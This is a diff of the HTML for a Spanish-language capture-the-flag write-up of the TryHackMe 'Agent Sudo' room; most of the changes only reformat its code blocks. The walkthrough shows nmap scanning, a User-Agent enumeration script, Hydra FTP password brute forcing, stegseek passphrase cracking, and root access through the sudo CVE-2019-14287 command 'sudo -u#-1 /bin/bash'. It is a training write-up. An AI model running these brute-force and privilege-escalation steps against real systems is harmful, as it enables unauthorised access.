@@ -6,7 +6,7 @@ https://tryhackme.com/room/agentsudoctf
 IP Atacante = 10.10.10.10
 IP víctima = 10.10.92.221
 Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene
-❯ ping -c 1 10.10.92.221 PING 10.10.92.221 (10.10.92.221) 56(84) bytes of data. 64 bytes from 10.10.92.221: icmp_seq=1 ttl=63 time=128 ms --- 10.10.92.221 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 127.'>
+1 2 3 4 5 6 7 ❯ ping -c 1 10.10.92.221 PING 10.10.92.221 (10.10.92.221) 56(84) bytes of data. 64 bytes from 10.10.92.221: icmp_seq=1 ttl=63 time=128 ms --- 10.'>
 <title>Resolución Agent sudo</title>
 
 <link rel='canonical' href='https://d3b0o.github.io/p/resoluci%C3%B3n-agent-sudo/'>
@@ -17,7 +17,7 @@ https://tryhackme.com/room/agentsudoctf
 IP Atacante = 10.10.10.10
 IP víctima = 10.10.92.221
 Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene
-❯ ping -c 1 10.10.92.221 PING 10.10.92.221 (10.10.92.221) 56(84) bytes of data. 64 bytes from 10.10.92.221: icmp_seq=1 ttl=63 time=128 ms --- 10.10.92.221 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 127.'>
+1 2 3 4 5 6 7 ❯ ping -c 1 10.10.92.221 PING 10.10.92.221 (10.10.92.221) 56(84) bytes of data. 64 bytes from 10.10.92.221: icmp_seq=1 ttl=63 time=128 ms --- 10.'>
 <meta property='og:url' content='https://d3b0o.github.io/p/resoluci%C3%B3n-agent-sudo/'>
 <meta property='og:site_name' content='d3b0o'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='CTF' /><meta property='article:tag' content='Fácil' /><meta property='article:tag' content='Linux' /><meta property='article:tag' content='Fuerza bruta' /><meta property='article:tag' content='CVE-2019-14287' /><meta property='article:tag' content='Archivos ocultos' /><meta property='article:published_time' content='2022-12-15T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-12-15T00:00:00&#43;00:00'/><meta property='og:image' content='https://d3b0o.github.io/p/resoluci%C3%B3n-agent-sudo/images/1.jpg' />
@@ -27,7 +27,7 @@ https://tryhackme.com/room/agentsudoctf
 IP Atacante = 10.10.10.10
 IP víctima = 10.10.92.221
 Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene
-❯ ping -c 1 10.10.92.221 PING 10.10.92.221 (10.10.92.221) 56(84) bytes of data. 64 bytes from 10.10.92.221: icmp_seq=1 ttl=63 time=128 ms --- 10.10.92.221 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 127."><meta name="twitter:card" content="summary_large_image">
+1 2 3 4 5 6 7 ❯ ping -c 1 10.10.92.221 PING 10.10.92.221 (10.10.92.221) 56(84) bytes of data. 64 bytes from 10.10.92.221: icmp_seq=1 ttl=63 time=128 ms --- 10."><meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content='https://d3b0o.github.io/p/resoluci%C3%B3n-agent-sudo/images/1.jpg' />
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-WKTZJ16NWQ"></script>
 <script>
@@ -362,6 +362,20 @@ if (!doNotTrack) {
         
 
         
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    6 minutos a leer
+                </time>
+            </div>
+        
     </footer>
     
 
@@ -380,20 +394,38 @@ if (!doNotTrack) {
 <p>IP víctima = 10.10.92.221</p>
 <h2 id="reconocimiento">Reconocimiento</h2>
 <p>Para empezar lo primero es comprobar si la máquina está activa y que OS tiene</p>
-<pre><code>❯ ping -c 1 10.10.92.221
-PING 10.10.92.221 (10.10.92.221) 56(84) bytes of data.
-64 bytes from 10.10.92.221: icmp_seq=1 ttl=63 time=128 ms
-
---- 10.10.92.221 ping statistics ---
-1 packets transmitted, 1 received, 0% packet loss, time 0ms
-rtt min/avg/max/mdev = 127.854/127.854/127.854/0.000 ms
-</code></pre>
-<p>En este caso da un ttl (time to live) de <strong>63</strong>, entendiendo que <strong>ttl=64: Linux</strong> / <strong>ttl=128: Windows</strong>. Esta máquina es <strong>Linux</strong> por aproximación</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">❯ ping -c 1 10.10.92.221
+</span></span><span class="line"><span class="cl">PING 10.10.92.221 (10.10.92.221) 56(84) bytes of data.
+</span></span><span class="line"><span class="cl">64 bytes from 10.10.92.221: icmp_seq=1 ttl=63 time=128 ms
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">--- 10.10.92.221 ping statistics ---
+</span></span><span class="line"><span class="cl">1 packets transmitted, 1 received, 0% packet loss, time 0ms
+</span></span><span class="line"><span class="cl">rtt min/avg/max/mdev = 127.854/127.854/127.854/0.000 ms
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>En este caso da un ttl (time to live) de <strong>63</strong>, entendiendo que <strong>ttl=64: Linux</strong> / <strong>ttl=128: Windows</strong>. Esta máquina es <strong>Linux</strong> por aproximación</p>
 <h3 id="escaneo-de-puertos-nmap">Escaneo de puertos (nmap)</h3>
 <p>Ahora empezamos con un escaneo de puertos</p>
-<pre><code>❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.92.221 -oG allPort
-</code></pre>
-<div class="table-wrapper"><table>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.92.221 -oG allPort
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="table-wrapper"><table>
 <thead>
 <tr>
 <th>Parámetro</th>
@@ -435,36 +467,72 @@ rtt min/avg/max/mdev = 127.854/127.854/127.854/0.000 ms
 <p><a class="link" href="https://pastebin.com/tYpwpauW"  target="_blank" rel="noopener"
     >Función extractPorts</a> de <a class="link" href="https://s4vitar.github.io"  target="_blank" rel="noopener"
     >@s4vitar</a></p>
-<pre><code>❯ extractPorts allPorts
-───────┬─────────────────────────────────────────────────────────────────────────────────────────
-       │ File: extractPorts.tmp
-───────┼─────────────────────────────────────────────────────────────────────────────────────────
-   1   │ 
-   2   │ [*] Extracting information...
-   3   │ 
-   4   │     [*] IP Address: 10.10.92.221
-   5   │     [*] Open ports: 21,22,80
-   6   │ 
-   7   │ [*] Ports copied to clipboard
-   8   │ 
-───────┴─────────────────────────────────────────────────────────────────────────────────────────
-</code></pre>
-<p>Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos</p>
-<pre><code>❯ nmap -p21,22,80 -sC -sV 10.10.92.221 -oN target
-
-PORT   STATE SERVICE VERSION
-21/tcp open  ftp     vsftpd 3.0.3
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 ef1f5d04d4779506d6072ecf058f2cc07 (RSA)
-|   256 5e02d19ac4e7430662c19e25848aed7ea (ECDSA)
-|_  256 2d005cdb9fda8c8d880e3924f8b4f18e2 (ED25519)
-80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-|_http-title: Annoucement
-|_http-server-header: Apache/2.4.29 (Ubuntu)
-Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
-</code></pre>
-<div class="table-wrapper"><table>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">❯ extractPorts allPorts
+</span></span><span class="line"><span class="cl">───────┬─────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span class="line"><span class="cl">       │ File: extractPorts.tmp
+</span></span><span class="line"><span class="cl">───────┼─────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span class="line"><span class="cl">   1   │ 
+</span></span><span class="line"><span class="cl">   2   │ [*] Extracting information...
+</span></span><span class="line"><span class="cl">   3   │ 
+</span></span><span class="line"><span class="cl">   4   │     [*] IP Address: 10.10.92.221
+</span></span><span class="line"><span class="cl">   5   │     [*] Open ports: 21,22,80
+</span></span><span class="line"><span class="cl">   6   │ 
+</span></span><span class="line"><span class="cl">   7   │ [*] Ports copied to clipboard
+</span></span><span class="line"><span class="cl">   8   │ 
+</span></span><span class="line"><span class="cl">───────┴─────────────────────────────────────────────────────────────────────────────────────────
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">❯ nmap -p21,22,80 -sC -sV 10.10.92.221 -oN target
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">21/tcp open  ftp     vsftpd 3.0.3
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+</span></span><span class="line"><span class="cl">| ssh-hostkey: 
+</span></span><span class="line"><span class="cl">|   2048 ef1f5d04d4779506d6072ecf058f2cc07 (RSA)
+</span></span><span class="line"><span class="cl">|   256 5e02d19ac4e7430662c19e25848aed7ea (ECDSA)
+</span></span><span class="line"><span class="cl">|_  256 2d005cdb9fda8c8d880e3924f8b4f18e2 (ED25519)
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+</span></span><span class="line"><span class="cl">|_http-title: Annoucement
+</span></span><span class="line"><span class="cl">|_http-server-header: Apache/2.4.29 (Ubuntu)
+</span></span><span class="line"><span class="cl">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="table-wrapper"><table>
 <thead>
 <tr>
 <th>Parámetro</th>
@@ -501,41 +569,82 @@ Agent R</p>
 <hr>
 <p>Según el texto podemos usar el &ldquo;nombre en clave&rdquo; como &ldquo;user agent&rdquo;. Vemos que está firmado como Agente R, se puede suponer que los agentes tienen una letra como nombre en clave. Con <code>curl -A &quot;A&quot; 10.10.92.221</code> podemos ver la web como Agente A, pero ir probando así hasta la z se puede hacer eterno, para eso e echo un script en python que atomatiza el proceso de las peticiones y guarda las repuestas distintas.</p>
 <p>User-Agent o también conocido como Agente de Usuario es una cabecera de texto que sirve para identificar al usuario que entra en una página web a través del navegador.</p>
-<pre><code class="language-python">from pwn import *
-import requests, signal, time, pbd, sys, string, os
-
-main_url = &quot;http://10.10.92.221&quot;
-characters = string.ascii_uppercase
-standard = requests.get(main_url)
-different = &quot;&quot;
-p1 = log.progress(&quot;Trying with Agent&quot;)
-p2 = log.progress(&quot;Agents with different response&quot;)
-
-for i in characters:
-    headers = {
-        'User-Agent': i
-    }
-
-    response = requests.get(main_url, headers=headers)
-    p1.status(i)
-    if response.text != standard.text:
-        different += &quot; {},&quot;.format(i) 
-        p2.status(different)
-        f = open ('agent_{}.txt'.format(i) ,'w')
-        f.write(response.text)
-        print(&quot;\n[*] Result saved on agent_{}.txt&quot;.format(i))
-        f.close()
-</code></pre>
-<p>Al ejecutarlo encuentra respuestas distintas con el Agente C y el Agente R</p>
-<pre><code class="language-bash">❯ python3 script.py
-[*] Trying with Agent: Z
-[*] Agents with different response:  C, R,
-
-[*] Result saved on agent_C.txt
-
-[*] Result saved on agent_R.txt
-</code></pre>
-<p>Dentro del agente_C.txt hay el siguiente mensaje</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span><span class="o">,</span> <span class="nn">signal</span><span class="o">,</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">pbd</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">string</span><span class="o">,</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">main_url</span> <span class="o">=</span> <span class="s2">&#34;http://10.10.92.221&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">characters</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_uppercase</span>
+</span></span><span class="line"><span class="cl"><span class="n">standard</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">main_url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">different</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">p1</span> <span class="o">=</span> <span class="n">log</span><span class="o">.</span><span class="n">progress</span><span class="p">(</span><span class="s2">&#34;Trying with Agent&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p2</span> <span class="o">=</span> <span class="n">log</span><span class="o">.</span><span class="n">progress</span><span class="p">(</span><span class="s2">&#34;Agents with different response&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">characters</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="n">i</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">main_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">p1</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span> <span class="o">!=</span> <span class="n">standard</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">different</span> <span class="o">+=</span> <span class="s2">&#34; </span><span class="si">{}</span><span class="s2">,&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">        <span class="n">p2</span><span class="o">.</span><span class="n">status</span><span class="p">(</span><span class="n">different</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span> <span class="p">(</span><span class="s1">&#39;agent_</span><span class="si">{}</span><span class="s1">.txt&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">[*] Result saved on agent_</span><span class="si">{}</span><span class="s2">.txt&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Al ejecutarlo encuentra respuestas distintas con el Agente C y el Agente R</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ python3 script.py
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Trying with Agent: Z
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Agents with different response:  C, R,
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Result saved on agent_C.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Result saved on agent_R.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Dentro del agente_C.txt hay el siguiente mensaje</p>
 <hr>
 <p>Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!</p>
 <hr>
@@ -543,9 +652,15 @@ for i in characters:
 <hr>
 <p>Como dice que su contraseña es débil con hydra vamos a intentar encontrarla usando un diccionario.</p>
 <p>Hydra se considera el software para ciberseguridad estándar para ejecutar ataques de fuerza bruta en cuentas de servicios.</p>
-<pre><code>hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.92.221 -t 40
-</code></pre>
-<div class="table-wrapper"><table>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.92.221 -t 40
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="table-wrapper"><table>
 <thead>
 <tr>
 <th style="text-align:center">Parámetro</th>
@@ -584,20 +699,39 @@ Agent C</p>
 <hr>
 <h3 id="cute-alienjpg">cute-alien.jpg</h3>
 <p>El Agente C dice que dentro de esta foto hay la contraseña de inicio de session del Agente J. Con steghide podemos intentar ver su contenido</p>
-<pre><code class="language-bash">❯ steghide extract -sf cute-alien.jpg
-Anotar salvoconducto: 
-steghide: �no pude extraer ning�n dato con ese salvoconducto!
-</code></pre>
-<p>No encuentra nada sin indicar salvoconducto. Para ello vamos a usar esta herramienta: <a class="link" href="https://github.com/RickdeJager/stegseek"  target="_blank" rel="noopener"
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ steghide extract -sf cute-alien.jpg
+</span></span><span class="line"><span class="cl">Anotar salvoconducto: 
+</span></span><span class="line"><span class="cl">steghide: �no pude extraer ning�n dato con ese salvoconducto!
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>No encuentra nada sin indicar salvoconducto. Para ello vamos a usar esta herramienta: <a class="link" href="https://github.com/RickdeJager/stegseek"  target="_blank" rel="noopener"
     >https://github.com/RickdeJager/stegseek</a> para atraves de un diccionario poder conseguir el contenido oculto de la foto.</p>
-<pre><code>❯ stegseek cute-alien.jpg /usr/share/wordlists/rockyou.txt
-StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
-
-[i] Found passphrase: &quot;Area51&quot;           
-[i] Original filename: &quot;message.txt&quot;.
-[i] Extracting to &quot;cute-alien.jpg.out&quot;.
-</code></pre>
-<h4 id="messagetxt">message.txt</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">❯ stegseek cute-alien.jpg /usr/share/wordlists/rockyou.txt
+</span></span><span class="line"><span class="cl">StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">[i] Found passphrase: &#34;Area51&#34;           
+</span></span><span class="line"><span class="cl">[i] Original filename: &#34;message.txt&#34;.
+</span></span><span class="line"><span class="cl">[i] Extracting to &#34;cute-alien.jpg.out&#34;.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="messagetxt">message.txt</h4>
 <p>Contenido del archivo message.txt renombrado a cute-alien.jpg.out</p>
 <hr>
 <p>Hi james,</p>
@@ -617,15 +751,30 @@ chris</p>
 <p>Ya podemos ver la flag de user.txt</p>
 <h2 id="escalada-de-privilegios">Escalada de privilegios</h2>
 <p>con <code>sudo -l</code> podemos ver que puede ejecutar como root</p>
-<pre><code class="language-bash">james@agent-sudo:~$ sudo -l
-User james may run the following commands on agent-sudo:
-    (ALL, !root) /bin/bash
-</code></pre>
-<p>E buscado el <code>(ALL, !root) /bin/bash</code> en google y e encontrado que esto es porque el sudo tiene una versión menor a la 1.8.27 lo que lo hace vulnerable. Se puede confirmar con:</p>
-<pre><code class="language-bash">james@agent-sudo:~$ sudo --version
-Sudo version 1.8.21p2
-</code></pre>
-<p>En el exploit (<a class="link" href="https://www.exploit-db.com/exploits/47502"  target="_blank" rel="noopener"
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">james@agent-sudo:~$ sudo -l
+</span></span><span class="line"><span class="cl">User james may run the following commands on agent-sudo:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL, !root<span class="o">)</span> /bin/bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>E buscado el <code>(ALL, !root) /bin/bash</code> en google y e encontrado que esto es porque el sudo tiene una versión menor a la 1.8.27 lo que lo hace vulnerable. Se puede confirmar con:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">james@agent-sudo:~$ sudo --version
+</span></span><span class="line"><span class="cl">Sudo version 1.8.21p2
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>En el exploit (<a class="link" href="https://www.exploit-db.com/exploits/47502"  target="_blank" rel="noopener"
     >https://www.exploit-db.com/exploits/47502</a>) lo que pone es que podemos ejecutar cosas con sudo de la siguiente forma:</p>
 <p><code>sudo -u#-1 /bin/bash</code></p>
 <p>De echo ejecutando eso ya somos root y podemos ver la flag en el /root/root.txt</p>
@@ -666,6 +815,30 @@ Sudo version 1.8.21p2
     <h2 class="section-title">Contenidos relacionados</h2>
     <div class="related-content">
         <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/resoluci%C3%B3n-wonderland/">
+        
+        
+            <div class="article-image">
+                <img src="/p/resoluci%C3%B3n-wonderland/images/portada.544990aae9de59c8a413955875bee210.png" 
+                        width="1914" 
+                        height="874" 
+                        loading="lazy"
+                        alt="Featured image of post Resolución Wonderland"
+                        
+                        data-hash="md5-VEmQquneWcikE5VYdb7iEA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Resolución Wonderland</h2>
+        </div>
+    </a>
+</article>
+
             
                 
 <article class="has-image">
@@ -758,30 +931,6 @@ Sudo version 1.8.21p2
 
         <div class="article-details">
             <h2 class="article-title">Resolución Tomghost</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/p/resoluci%C3%B3n-wgel/">
-        
-        
-            <div class="article-image">
-                <img src="/p/resoluci%C3%B3n-wgel/images/2.ce0967ca6b0dead5b9edaef85b680e16.png" 
-                        width="1914" 
-                        height="874" 
-                        loading="lazy"
-                        alt="Featured image of post Resolución Wgel"
-                        
-                        data-hash="md5-zglnymsN6tW57a74W2gOFg==">
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">Resolución Wgel</h2>
         </div>
     </a>
 </article>
